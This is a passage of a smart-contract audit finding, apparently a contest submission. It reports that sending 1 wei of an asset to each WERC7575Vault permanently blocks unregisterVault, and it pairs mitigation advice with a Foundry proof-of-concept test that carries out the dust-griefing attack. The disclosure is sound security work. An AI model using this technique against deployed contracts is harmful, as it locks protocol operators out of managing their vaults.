  "user_handle": "farismaulana",
  "body": "## Finding description and impact\n\nas we can see in [`WERC7575ShareToken::unregisterVault`](https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575ShareToken.sol#L262-L279) there are strict balance check of asset that must be zero for each WERC7575Vault contract.\nas we know the WERC7575Vault impose a 1:1 rate of USDC (asset) and its share counterpart (WUSD), which mean directly sending 1 wei asset to the vault would mean it would create 1 wei of asset that does not have shares, meaning it would never be able to withdrawn from the contract.\n\ngiven how the share token also have strict `MAX_VAULTS_PER_SHARE_TOKEN`, the impact of DoS would be severe as the contract can have 10 maximum of asset to vault which if this is exhausted, there are no way to sunset an asset vault and add new one. creating new share token would not solve this problem as it would add unnecessary complexity to the already complex settlement/investment layer.\n\nthe issue also exist in `ShareTokenUpgradeable` counterpart.\n\n## Recommended mitigation steps\n\nwhen unregistering a vault, add minimum balance that can be neglected instead of using strict 0 amount.\nor add rescue token functionality so admin can transfer the dust amount to another address, making the vault balance 0.",
  "proof_of_concept": "use `test/WERC7575.t.sol` for this test:\n\n```solidity\n    function test_dosUnregisterVault() public {\n        address attacker = makeAddr(\"attacker\");\n        ERC20Faucet[] memory tokens = new ERC20Faucet[](10);\n        WERC7575Vault[] memory vaults = new WERC7575Vault[](10);\n\n        // add 10 asset token and give attacker 1 wei each\n        for (uint256 i; i < 9; i++) {\n            tokens[i] = new ERC20Faucet(\"TEST\", \"TEST\", TOTAL_SUPPLY);\n            vaults[i] = new WERC7575Vault(address(tokens[i]), shareToken);\n            deal(address(tokens[i]), attacker, 1);\n        }\n        tokens[9] = token; // from setup\n        vaults[9] = vault; // from setup\n        deal(address(tokens[9]), attacker, 1);\n\n        // admin register new 9 asset\n        for (uint256 i; i < tokens.length - 1; i++) {\n            shareToken.registerVault(address(tokens[i]), address(vaults[i]));\n        }\n\n        // attacker sent 1 wei to each vaults\n        for (uint256 i; i < tokens.length; i++) {\n            vm.prank(attacker);\n            tokens[i].transfer(address(vaults[i]), 1);\n        }\n\n        for (uint256 i; i < tokens.length; i++) {\n            // but because there are 1 wei from attacker, unregister would revert\n            vm.expectRevert();\n            shareToken.unregisterVault(address(tokens[i]));\n        }\n\n    }\n```",
